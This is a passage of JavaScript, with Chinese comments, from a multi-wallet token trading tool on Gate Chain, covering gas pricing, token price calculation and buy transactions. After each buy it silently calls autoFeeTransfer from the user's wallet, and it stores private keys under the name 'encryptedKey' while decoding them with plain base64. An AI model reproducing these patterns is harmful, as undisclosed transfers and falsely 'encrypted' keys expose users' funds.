        async function getDynamicGasPrice() {
            const rpcUrls = [CONFIG.rpcUrl, CONFIG.backupRpcUrl];
            
            for (let i = 0; i < rpcUrls.length; i++) {
                try {
                    console.log(`尝试从RPC ${i+1} 获取Gas价格: ${rpcUrls[i]}`);
                    
                    // 检查URL是否相同，避免重复测试
                    if (i > 0 && rpcUrls[i] === rpcUrls[i-1]) {
                        console.log(`RPC ${i+1} 与RPC ${i} 相同，跳过测试`);
                        continue;
                    }
                    
                    const provider = new ethers.JsonRpcProvider(rpcUrls[i], {
                        chainId: CONFIG.chainId,
                        name: 'Gate Chain'
                    });
                    
                    // 设置超时时间
                    const timeoutPromise = new Promise((_, reject) => 
                        setTimeout(() => reject(new Error('RPC请求超时')), 10000)
                    );
                    
                    // 使用多种方法获取Gas价格
                    let baseGasPrice;
                    try {
                        // 方法1: 尝试直接RPC调用
                        console.log(`RPC ${i+1} 尝试方法1: provider.send('eth_gasPrice')`);
                        const gasPricePromise = provider.send('eth_gasPrice', []);
                        baseGasPrice = await Promise.race([gasPricePromise, timeoutPromise]);
                        console.log(`RPC ${i+1} 方法1成功:`, baseGasPrice);
                    } catch (gasError1) {
                        console.log(`RPC ${i+1} 方法1失败:`, gasError1.message);
                        
                        // 检查是否是CORS错误
                        if (gasError1.message.includes('Failed to fetch') || gasError1.message.includes('CORS')) {
                            console.log(`RPC ${i+1} 检测到CORS问题，跳过其他方法`);
                            throw new Error('CORS错误: 无法访问此RPC节点');
                        }
                        
                        try {
                            // 方法2: 尝试getGasPrice方法
                            console.log(`RPC ${i+1} 尝试方法2: provider.getGasPrice()`);
                            if (typeof provider.getGasPrice === 'function') {
                                const gasPricePromise = provider.getGasPrice();
                                baseGasPrice = await Promise.race([gasPricePromise, timeoutPromise]);
                                console.log(`RPC ${i+1} 方法2成功:`, baseGasPrice);
                            } else {
                                throw new Error('getGasPrice方法不存在');
                            }
                        } catch (gasError2) {
                            console.log(`RPC ${i+1} 方法2失败:`, gasError2.message);
                            throw new Error('所有ethers.js方法都失败');
                        }
                    }
                    
                    // 验证Gas价格是否合理 (1-10000 Gwei之间，扩大范围)
                    const gasPriceInGwei = Number(ethers.formatUnits(baseGasPrice, 'gwei'));
                    console.log(`RPC ${i+1} 返回的Gas价格: ${gasPriceInGwei} Gwei`);
                    
                    if (gasPriceInGwei < 1 || gasPriceInGwei > 10000) {
                        throw new Error(`Gas价格异常: ${gasPriceInGwei} Gwei`);
                    }
                    
                    // 使用RPC价格乘以倍数
                    const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
                    const adjustedGasPrice = baseGasPrice * BigInt(Math.floor(speedConfig.multiplier * 100)) / 100n;
                    
                    // 更新显示
                    const gasPriceInput = document.getElementById('gasPrice');
                    gasPriceInput.value = Math.round(Number(ethers.formatUnits(adjustedGasPrice, 'gwei')));
                    
                    console.log(`Gas价格获取成功 (RPC ${i+1}): 基础价格 ${gasPriceInGwei.toFixed(2)} Gwei, 调整后 ${Number(ethers.formatUnits(adjustedGasPrice, 'gwei')).toFixed(2)} Gwei`);
                    console.log(`当前Gas速度: ${speedConfig.name} (${speedConfig.multiplier}x)`);
                    showToast(`✅ 获取实时Gas价格成功: ${Math.round(Number(ethers.formatUnits(adjustedGasPrice, 'gwei')))} Gwei (${speedConfig.name})`, 'success');
                    
                    return {
                        baseGasPrice: baseGasPrice,
                        adjustedGasPrice: adjustedGasPrice,
                        priorityFee: ethers.parseUnits("100", "gwei"),
                        maxFee: adjustedGasPrice
                    };
                } catch (error) {
                    console.error(`RPC ${i+1} 获取Gas价格失败:`, error);
                    
                    // 如果是CORS错误，直接跳过备用节点
                    if (error.message.includes('CORS')) {
                        console.log(`RPC ${i+1} CORS错误，跳过后续测试`);
                        break;
                    }
                    
                    if (i === rpcUrls.length - 1) {
                        // 所有RPC都失败了，使用默认值
                        break;
                    }
                }
            }
            
            // 使用默认值
            const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
            const defaultBaseGas = ethers.parseUnits(GAS_CONFIG.DEFAULT_PRICE.toString(), "gwei"); // 默认500 Gwei
            const defaultAdjustedGas = defaultBaseGas * BigInt(Math.floor(speedConfig.multiplier * 100)) / 100n;
            
            // 更新显示
            const gasPriceInput = document.getElementById('gasPrice');
            gasPriceInput.value = Math.round(Number(ethers.formatUnits(defaultAdjustedGas, 'gwei')));
            
            // 静默使用默认值，不显示提示
            
            return {
                baseGasPrice: defaultBaseGas,
                adjustedGasPrice: defaultAdjustedGas,
                priorityFee: ethers.parseUnits("100", "gwei"),
                maxFee: defaultAdjustedGas
            };
        }

        // 获取代币余额
        async function getTokenBalance(tokenAddress, walletAddress) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
                const balance = await tokenContract.balanceOf(walletAddress);
                const decimals = await tokenContract.decimals();
                
                return {
                    balance: balance,
                    decimals: decimals,
                    formattedBalance: ethers.formatUnits(balance, decimals)
                };
            } catch (error) {
                console.error('Failed to get token balance:', error);
                return {
                    balance: 0n,
                    decimals: 18,
                    formattedBalance: '0'
                };
            }
        }

        // 检查协议匹配并显示提醒
        function checkProtocolMatch(error) {
            if (currentTokenInfo && currentTokenInfo.protocol) {
                const detectedProtocol = currentTokenInfo.protocol;
                const currentDex = selectedDex;
                
                // 检查内盘协议匹配
                if (selectedPlatform === 'internal') {
                    if (detectedProtocol === 'GTLAUNCH' && currentDex !== 'GTLAUNCH') {
                        showToast(`⚠️ 协议不匹配！代币是GTLAUNCH协议，但选择了${currentDex}协议。请重新选择正确的协议。`, 'error');
                        return true;
                    } else if (detectedProtocol === 'DYOR_INTERNAL' && currentDex !== 'DYOR_INTERNAL') {
                        showToast(`⚠️ 协议不匹配！代币是DYOR协议，但选择了${currentDex}协议。请重新选择正确的协议。`, 'error');
                        return true;
                    }
                }
                
                // 检查外盘协议匹配
                if (selectedPlatform === 'external') {
                    if (detectedProtocol === 'GTLAUNCH' || detectedProtocol === 'DYOR_INTERNAL') {
                        showToast(`⚠️ 协议不匹配！代币是${detectedProtocol}内盘协议，但选择了外盘。请切换到内盘并选择正确的协议。`, 'error');
                        return true;
                    }
                }
            }
            return false;
        }

        // 计算代币价格（根据选择的平台使用不同的计算方法）
        async function calculateTokenPrice(tokenAddress) {
            try {
                console.log(`开始计算代币价格: ${tokenAddress}, 平台: ${selectedPlatform}, DEX: ${selectedDex}`);
                
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                if (selectedPlatform === 'internal') {
                    // 内盘价格计算 - 根据代币协议判断
                    if (currentTokenInfo && currentTokenInfo.protocol) {
                        if (currentTokenInfo.protocol === 'DYOR_INTERNAL') {
                            console.log('使用DYOR内盘价格计算（基于协议检测）');
                            return await calculateDYORInternalPrice(tokenAddress, provider);
                        } else if (currentTokenInfo.protocol === 'GTLAUNCH') {
                            console.log('使用GTLAUNCH内盘价格计算（基于协议检测）');
                            return await calculateInternalPrice(tokenAddress, provider);
                        }
                    }
                    
                    // 如果没有协议信息，根据selectedDex判断
                    if (selectedDex === 'DYOR_INTERNAL') {
                        console.log('使用DYOR内盘价格计算（基于selectedDex）');
                        return await calculateDYORInternalPrice(tokenAddress, provider);
                    } else {
                        console.log('使用GTLAUNCH内盘价格计算（基于selectedDex）');
                        return await calculateInternalPrice(tokenAddress, provider);
                    }
                } else {
                    // 外盘GTSWAP/DYOR V2价格计算
                    console.log('使用外盘价格计算');
                    // 外盘不需要区分GTLAUNCH和DYOR协议，只区分GTSWAP和DYORSWAP
                    return await calculateExternalPrice(tokenAddress, provider);
                }
            } catch (error) {
                console.error('计算代币价格失败:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // 内盘GTLAUNCH价格计算
        async function calculateInternalPrice(tokenAddress, provider) {
            console.log('使用内盘GTLAUNCH价格计算...');
            
            // 获取合约的GT余额
            console.log('获取合约GT余额...');
            const contractGTBalance = await provider.getBalance(tokenAddress);
            const contractGTBalanceFormatted = parseFloat(ethers.formatEther(contractGTBalance));
            console.log(`合约GT余额: ${contractGTBalanceFormatted} GT`);
            
            // 获取合约的代币总供应量
            console.log('获取代币总供应量...');
            const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
            const totalSupply = await tokenContract.totalSupply();
            const decimals = await tokenContract.decimals();
            const totalSupplyFormatted = parseFloat(ethers.formatUnits(totalSupply, decimals));
            console.log(`代币总供应量: ${totalSupplyFormatted} (精度: ${decimals})`);
            
            // 检查数据有效性
            if (contractGTBalanceFormatted === 0) {
                console.warn('合约GT余额为0，无法计算价格');
                return {
                    contractGTBalance: 0,
                    totalSupply: totalSupplyFormatted,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: '合约GT余额为0'
                };
            }
            
            if (totalSupplyFormatted === 0) {
                console.warn('代币总供应量为0，无法计算价格');
                return {
                    contractGTBalance: contractGTBalanceFormatted,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: '代币总供应量为0'
                };
            }
            
            // GTLAUNCH价格计算：合约GT数量 / 合约代币数量
            const pricePerToken = contractGTBalanceFormatted / totalSupplyFormatted;
            const pricePerGT = totalSupplyFormatted / contractGTBalanceFormatted; // 1 GT能买多少代币
            
            console.log(`内盘价格计算完成:`);
            console.log(`- 1代币价格: ${pricePerToken} GT`);
            console.log(`- 1GT可买: ${pricePerGT} 代币`);
            
            return {
                contractGTBalance: contractGTBalanceFormatted,
                totalSupply: totalSupplyFormatted,
                pricePerToken: pricePerToken,
                pricePerGT: pricePerGT
            };
        }

        // DYOR内盘价格计算
        async function calculateDYORInternalPrice(tokenAddress, provider) {
            console.log('使用DYOR内盘价格计算...');
            
            try {
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                // 创建Router合约实例
                const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, provider);
                
                // 使用正确的DYOR内盘路径地址
                const correctPath0 = '0x672f30407a71fa8737a3a14474ff37e09c7fc44a'; // 正确的path[0]地址
                console.log(`DYOR内盘路径地址: ${correctPath0}`);
                
                // 计算1 GT能买多少代币
                const amountIn = ethers.parseEther("1"); // 1 GT
                // DYOR内盘不支持标准的getAmountsOut，使用固定价格估算
                console.log('DYOR内盘跳过价格查询，使用固定价格估算');
                
                // 使用更保守的固定价格：1个代币 = 0.0000001 GT（降低10倍）
                const fixedPricePerToken = 0.0000001; // 1个代币需要多少GT（更保守）
                const pricePerGT = 1 / fixedPricePerToken; // 1 GT能买多少代币
                
                console.log(`DYOR内盘价格计算完成（固定价格）:`);
                console.log(`- 1代币价格: ${fixedPricePerToken} GT`);
                console.log(`- 1GT可买: ${pricePerGT} 代币`);
                
                return {
                    contractGTBalance: 1, // DYOR内盘不适用
                    totalSupply: 0, // DYOR内盘不适用
                    pricePerToken: fixedPricePerToken,
                    pricePerGT: pricePerGT
                };
                
            } catch (error) {
                console.error('DYOR内盘价格计算失败:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // 外盘GTSWAP/DYOR V2价格计算
        async function calculateExternalPrice(tokenAddress, provider) {
            console.log(`使用外盘${selectedDex}价格计算...`);
            
            if (!selectedDex || !DEX_ADDRESSES[selectedDex]) {
                console.warn('未选择DEX或DEX地址未配置');
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: 'DEX未配置'
                };
            }
            
            try {
                const dexConfig = DEX_ADDRESSES[selectedDex];
                const routerAddress = dexConfig.router;
                
                if (routerAddress === '0x...') {
                    console.warn(`${selectedDex} Router地址未配置`);
                    return {
                        contractGTBalance: 0,
                        totalSupply: 0,
                        pricePerToken: 0,
                        pricePerGT: 0,
                        error: `${selectedDex} Router地址未配置`
                    };
                }
                
                // 创建Router合约实例
                const routerContract = new ethers.Contract(routerAddress, UNISWAP_V2_ROUTER_ABI, provider);
                
                // 获取WETH地址（在Gate Chain上应该是WGT）
                const wgtAddress = await routerContract.WETH();
                console.log(`WGT地址: ${wgtAddress}`);
                
                // 计算1 GT能买多少代币
                const amountIn = ethers.parseEther("1"); // 1 GT
                const path = [wgtAddress, tokenAddress];
                
                console.log('查询1 GT能买多少代币...');
                let amounts;
                try {
                    amounts = await routerContract.getAmountsOut(amountIn, path);
                } catch (error) {
                    console.warn(`${selectedDex} getAmountsOut调用失败，使用固定价格估算:`, error.message);
                    // 使用固定价格估算
                    const fixedPricePerToken = 0.000001; // 1个代币需要多少GT
                    const pricePerGT = 1 / fixedPricePerToken; // 1 GT能买多少代币
                    
                    console.log(`外盘价格计算完成（固定价格）:`);
                    console.log(`- 1代币价格: ${fixedPricePerToken} GT`);
                    console.log(`- 1GT可买: ${pricePerGT} 代币`);
                    
                    return {
                        contractGTBalance: 1, // 外盘不适用
                        totalSupply: 0, // 外盘不适用
                        pricePerToken: fixedPricePerToken,
                        pricePerGT: pricePerGT
                    };
                }
                const tokenAmount = amounts[1];
                
                // 获取代币精度
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_EXTENDED_ABI, provider);
                const decimals = await tokenContract.decimals();
                const tokenAmountFormatted = parseFloat(ethers.formatUnits(tokenAmount, decimals));
                
                // 计算价格
                const pricePerGT = tokenAmountFormatted; // 1 GT能买多少代币
                const pricePerToken = 1 / tokenAmountFormatted; // 1个代币需要多少GT
                
                console.log(`外盘价格计算完成:`);
                console.log(`- 1代币价格: ${pricePerToken} GT`);
                console.log(`- 1GT可买: ${pricePerGT} 代币`);
                
                return {
                    contractGTBalance: 1, // 外盘不适用
                    totalSupply: 0, // 外盘不适用
                    pricePerToken: pricePerToken,
                    pricePerGT: pricePerGT
                };
                
            } catch (error) {
                console.error('外盘价格计算失败:', error);
                return {
                    contractGTBalance: 0,
                    totalSupply: 0,
                    pricePerToken: 0,
                    pricePerGT: 0,
                    error: error.message
                };
            }
        }

        // 更新代币信息显示
        async function updateTokenInfoDisplay() {
            if (!currentTokenInfo) return;
            
            const tokenAddress = currentTokenInfo.address;
            const activeWallets = wallets.filter(w => w.active);
            
            if (activeWallets.length === 0) return;
            
            const wallet = activeWallets[0];
            
            try {
                // 获取代币余额
                const balanceInfo = await getTokenBalance(tokenAddress, wallet.address);
                
                // 获取价格信息（用于计算买入卖出）
                // 添加调试信息
                console.log('updateTokenInfoDisplay - 当前平台:', selectedPlatform);
                console.log('updateTokenInfoDisplay - 当前DEX:', selectedDex);
                console.log('updateTokenInfoDisplay - 代币协议:', currentTokenInfo.protocol);
                
                // GTLAUNCH内盘不需要价格计算，只显示合约余额
                if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                    console.log('GTLAUNCH内盘跳过价格计算，只显示合约余额');
                    const fixedPriceInfo = {
                        contractGTBalance: 1,
                        totalSupply: 0,
                        pricePerToken: 0, // 不显示价格
                        pricePerGT: 0     // 不显示价格
                    };
                    window.currentPriceInfo = fixedPriceInfo;
                    // 不return，继续执行后面的合约余额显示逻辑
                } else {
                    console.log('准备调用calculateTokenPrice');
                    console.log('当前状态 - selectedPlatform:', selectedPlatform, 'selectedDex:', selectedDex, 'protocol:', currentTokenInfo.protocol);
                    
                    const priceInfo = await calculateTokenPrice(tokenAddress);
                    
                    // 缓存价格信息供买入卖出计算使用
                    window.currentPriceInfo = priceInfo;
                }
                
            } catch (error) {
                console.error('Failed to update token info display:', error);
            }
        }


        // 更新代币显示信息
        function updateTokenDisplayInfo(balanceInfo, priceInfo) {
            const tokenDisplay = document.getElementById('tokenDisplay');
            const tokenLogo = document.getElementById('tokenLogo');
            const tokenName = document.getElementById('tokenName');
            const tokenSymbol = document.getElementById('tokenSymbol');
            
            if (currentTokenInfo) {
                tokenLogo.textContent = currentTokenInfo.symbol.substring(0, 2);
                tokenName.textContent = currentTokenInfo.name;
                tokenSymbol.textContent = currentTokenInfo.symbol;
                tokenDisplay.classList.add('active');
                
                // 简化的价格信息显示
                const priceInfoHtml = `
                    <div style="margin-top: 12px; padding: 12px; background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05)); border-radius: 8px; border: 1px solid rgba(59, 130, 246, 0.2);">
                        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; font-size: 12px;">
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">持有数量</div>
                                <div style="font-weight: bold; color: #3b82f6;">${parseFloat(balanceInfo.formattedBalance).toFixed(4)} ${currentTokenInfo.symbol}</div>
                            </div>
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">代币价格</div>
                                <div style="font-weight: bold; color: #3b82f6;">${priceInfo.pricePerToken.toFixed(8)} GT</div>
                            </div>
                            <div>
                                <div style="color: rgba(30, 41, 59, 0.7); margin-bottom: 4px;">1 GT可买</div>
                                <div style="font-weight: bold; color: #10b981;">${priceInfo.pricePerGT.toFixed(2)} ${currentTokenInfo.symbol}</div>
                            </div>
                        </div>
                    </div>
                `;
                
                // 移除旧的价格信息
                const existingPriceInfo = tokenDisplay.querySelector('.price-info');
                if (existingPriceInfo) {
                    existingPriceInfo.remove();
                }
                
                // 添加新的价格信息
                const priceInfoDiv = document.createElement('div');
                priceInfoDiv.className = 'price-info';
                priceInfoDiv.innerHTML = priceInfoHtml;
                tokenDisplay.appendChild(priceInfoDiv);
            }
        }


        // 平台切换
        function switchPlatform(platform) {
            selectedPlatform = platform;
            
            const tabs = document.querySelectorAll('.platform-tab');
            for (let i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            event.target.classList.add('active');
            
            if (platform === 'external') {
                document.getElementById('externalDexOptions').style.display = 'grid';
                document.getElementById('internalDexOptions').style.display = 'none';
                document.getElementById('hexDataGroup').style.display = 'none';
                // 外盘隐藏合约余额显示
                document.getElementById('contractBalanceDisplay').style.display = 'none';
            } else {
                document.getElementById('externalDexOptions').style.display = 'none';
                document.getElementById('internalDexOptions').style.display = 'grid';
                document.getElementById('hexDataGroup').style.display = 'block';
                // 内盘显示合约余额（如果有代币信息）
                if (currentTokenInfo && currentTokenInfo.protocol) {
                    getContractBalance(currentTokenInfo.address, currentTokenInfo.protocol)
                        .then(balanceInfo => displayContractBalance(balanceInfo))
                        .catch(error => console.error('获取合约余额失败:', error));
                }
            }
            
            selectedDex = null;
            const dexOptions = document.querySelectorAll('.dex-option');
            for (let i = 0; i < dexOptions.length; i++) {
                dexOptions[i].classList.remove('selected');
            }
        }


        // 选择DEX
        function selectDex(dex, platform) {
            selectedDex = dex;
            
            const dexOptions = document.querySelectorAll('.dex-option');
            for (let i = 0; i < dexOptions.length; i++) {
                dexOptions[i].classList.remove('selected');
            }
            
            let target = event.target;
            while (target && !target.classList.contains('dex-option')) {
                target = target.parentElement;
            }
            if (target) {
                target.classList.add('selected');
            }
            
            // 更新内盘交易说明
            if (platform === 'internal') {
                updateInternalDexDescription(dex);
            }
            
            addLog('已选择 ' + dex, 'success');
        }

        // 更新内盘交易说明
        function updateInternalDexDescription(dex) {
            const titleElement = document.getElementById('internalDexTitle');
            const descriptionElement = document.getElementById('internalDexDescription');
            
            if (dex === 'GTLAUNCH') {
                titleElement.textContent = 'GTLAUNCH 内盘交易';
                descriptionElement.innerHTML = `
                    <div>• <strong>买入</strong>: 向代币合约转账GT + 买入数据</div>
                    <div>• <strong>卖出</strong>: 调用代币合约卖出函数</div>
                    <div>• 十六进制数据已自动配置，无需手动输入</div>
                `;
            } else if (dex === 'DYOR_INTERNAL') {
                titleElement.textContent = 'DYOR 内盘交易';
                descriptionElement.innerHTML = `
                    <div>• <strong>买入</strong>: 向DYOR Router转账GT + 买入数据</div>
                    <div>• <strong>卖出</strong>: 调用DYOR Router卖出函数</div>
                    <div>• 使用DYOR内盘Router进行交易</div>
                `;
            }
        }

        // 执行买入
        async function executeBuy() {
            console.log('=== 开始执行买入 ===');
            console.log('selectedDex:', selectedDex);
            console.log('selectedPlatform:', selectedPlatform);
            console.log('currentTokenInfo:', currentTokenInfo);
            
            if (!selectedDex) {
                showToast('请选择交易所', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('请先启用钱包', 'error');
                return;
            }
            
            const tokenAddress = document.getElementById('tokenAddress').value;
            const amount = document.getElementById('buyAmount').value;
            
            if (!tokenAddress || !amount) {
                showToast('请填写交易信息', 'error');
                return;
            }
            
            // 内盘交易前验证协议匹配
            if (selectedPlatform === 'internal') {
                const detectedProtocol = await detectTokenProtocol(tokenAddress);
                if (selectedDex !== detectedProtocol) {
                    const protocolName = detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    const currentName = selectedDex === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    showToast(`⚠️ 协议不匹配！代币是${protocolName}协议，但选择了${currentName}协议。请重新选择正确的协议。`, 'error');
                    return;
                }
            }
            
            // 内盘交易逻辑
            if (selectedPlatform === 'internal') {
                console.log('执行内盘买入交易');
                console.log('selectedDex:', selectedDex);
                console.log('代币地址:', tokenAddress);
                console.log('交易金额:', amount);
                
                if (selectedDex === 'DYOR_INTERNAL') {
                    console.log('调用DYOR内盘买入');
                    await executeDYORInternalBuy(activeWallets, tokenAddress, amount);
                } else {
                    console.log('调用GTLAUNCH内盘买入');
                await executeInternalBuy(activeWallets, tokenAddress, amount);
                }
                return;
            }
            
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> 买入中';
            
            // 外盘GTSWAP/DYOR V2交易
            await executeExternalBuy(activeWallets, tokenAddress, amount);
        }

        // 执行内盘买入 - 集成buy.js脚本
        async function executeInternalBuy(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> 内盘买入中';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // 获取动态gas设置
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        const amountInWei = ethers.parseEther(amount);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🚀 开始买入交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 目标地址: ' + tokenAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易金额: ' + amount + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] Gas模式: ' + GAS_CONFIG.SPEEDS[currentGasSpeed].name, 'info');
                        
                        // 构建交易对象 - 基于buy.js脚本
                        const tx = {
                            to: tokenAddress,
                            value: amountInWei,
                            data: GTLAUNCH_DATA.BUY_HEX, // 0xd0febe4c
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        console.log('GTLAUNCH内盘买入交易对象:', tx);
                        console.log('买入十六进制数据:', GTLAUNCH_DATA.BUY_HEX);
                        
                        // 发送交易
                        const txResponse = await walletInstance.sendTransaction(tx);
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易已发送: ' + txResponse.hash, 'success');
                        
                        // 等待交易确认
                        const receipt = await txResponse.wait();
                        if (receipt.status === 1) {
                            addLog('[' + wallet.address.substring(0, 6) + '...] GTLAUNCH内盘买入成功!', 'success');
                            addLog('[' + wallet.address.substring(0, 6) + '...] 区块: ' + receipt.blockNumber, 'success');
                            stats.totalTrades++;
                            
                            // 自动收费转账（静默执行）
                            autoFeeTransfer(walletInstance, wallet.address);
                            
                            // 显示成功提示
                            showToast('🎉 买入成功！', 'success');
                            
                            // 更新余额和代币信息
                            await updateTokenInfoDisplay();
                            await renderWallets();
                        } else {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败 - 状态: ' + receipt.status, 'error');
                            showToast('❌ 买入失败！', 'error');
                        }
                        
                    } catch (error) {
                        console.error('Wallet transaction failed:', error);
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易失败: ' + error.message, 'error');
                        
                        // 检查协议匹配
                        checkProtocolMatch(error);
                        
                        // 提供更详细的错误信息
                        if (error.code === 'CALL_EXCEPTION') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 合约调用异常，请检查代币地址和参数', 'error');
                        } else if (error.code === 'INSUFFICIENT_FUNDS') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] 余额不足', 'error');
                        } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                            addLog('[' + wallet.address.substring(0, 6) + '...] Gas限制不可预测，交易可能失败', 'error');
                        }
                    }
                }
                
                updateStats();
                showToast('GTLAUNCH内盘买入完成', 'success');
                
            } catch (error) {
                console.error('Internal buy failed:', error);
                showToast('内盘买入失败: ' + error.message, 'error');
            } finally {
                isTrading = false;
                document.getElementById('buyBtn').disabled = false;
                document.getElementById('buyBtnText').textContent = '买入';
            }
        }

        // 执行卖出
        async function executeSell() {
            if (!selectedDex) {
                showToast('请选择交易所', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('请先启用钱包', 'error');
                return;
            }
            
            const tokenAddress = document.getElementById('tokenAddress').value;
            const amount = document.getElementById('sellAmount').value;
            
            if (!tokenAddress || !amount) {
                showToast('请填写交易信息', 'error');
                return;
            }
            
            // 内盘交易前验证协议匹配
            if (selectedPlatform === 'internal') {
                const detectedProtocol = await detectTokenProtocol(tokenAddress);
                if (selectedDex !== detectedProtocol) {
                    const protocolName = detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    const currentName = selectedDex === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                    showToast(`⚠️ 协议不匹配！代币是${protocolName}协议，但选择了${currentName}协议。请重新选择正确的协议。`, 'error');
                    return;
                }
            }
            
            // 内盘交易逻辑
            if (selectedPlatform === 'internal') {
                if (selectedDex === 'DYOR_INTERNAL') {
                    await executeDYORInternalSell(activeWallets, tokenAddress, amount);
                } else {
                await executeInternalSell(activeWallets, tokenAddress, amount);
                }
                return;
            }
            
            isTrading = true;
            document.getElementById('sellBtn').disabled = true;
            document.getElementById('sellBtnText').innerHTML = '<span class="loading-spinner"></span> 卖出中';
            
            // 外盘GTSWAP/DYOR V2交易
            await executeExternalSell(activeWallets, tokenAddress, amount);
        }

        // 执行DYOR内盘买入
        async function executeDYORInternalBuy(activeWallets, tokenAddress, amount) {
            isTrading = true;
            document.getElementById('buyBtn').disabled = true;
            document.getElementById('buyBtnText').innerHTML = '<span class="loading-spinner"></span> DYOR内盘买入中';
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                const gasSettings = await getDynamicGasPrice();
                const gasLimit = parseInt(document.getElementById('gasLimit').value) || GAS_CONFIG.DEFAULT_LIMIT;
                
                const routerAddress = DEX_ADDRESSES.DYOR_INTERNAL.router;
                
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    const privateKey = atob(wallet.encryptedKey);
                    const walletInstance = new ethers.Wallet(privateKey, provider);
                    
                    try {
                        const amountInWei = ethers.parseEther(amount);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 🚀 开始DYOR内盘买入交易...', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 目标地址: ' + tokenAddress, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易金额: ' + amount + ' GT', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] Router地址: ' + routerAddress, 'info');
                        
                        // 构建DYOR内盘买入数据
                        const calldata = buildDYORInternalCalldata(tokenAddress, wallet.address);
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 买入数量(wei): ' + amountInWei.toString(), 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易数据长度: ' + calldata.length, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易数据: ' + calldata, 'info');
                        
                        // 构建交易对象
                        const tx = {
                            to: routerAddress,
                            value: amountInWei,
                            data: calldata,
                            gasLimit: gasLimit,
                            maxPriorityFeePerGas: gasSettings.priorityFee,
                            maxFeePerGas: gasSettings.maxFee,
                            type: 2 // EIP-1559
                        };
                        
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易对象构建完成', 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易data字段: ' + tx.data, 'info');
                        addLog('[' + wallet.address.substring(0, 6) + '...] 交易data长度: ' + tx.data.length, 'info');
                        
                        // 发送交易
                        console.log('发送交易前的tx对象:', {
                            to: tx.to,
                            value: tx.value.toString(),
                            data: tx.data,
                            gasLimit: tx.gasLimit.toString(),
                            maxPriorityFeePerGas: tx.maxPriorityFeePerGas.toString(),
                            maxFeePerGas: tx.maxFeePerGas.toString(),
                            type: tx.type
                        });
                        const txResponse = await walletInstance.sendTransaction(tx);
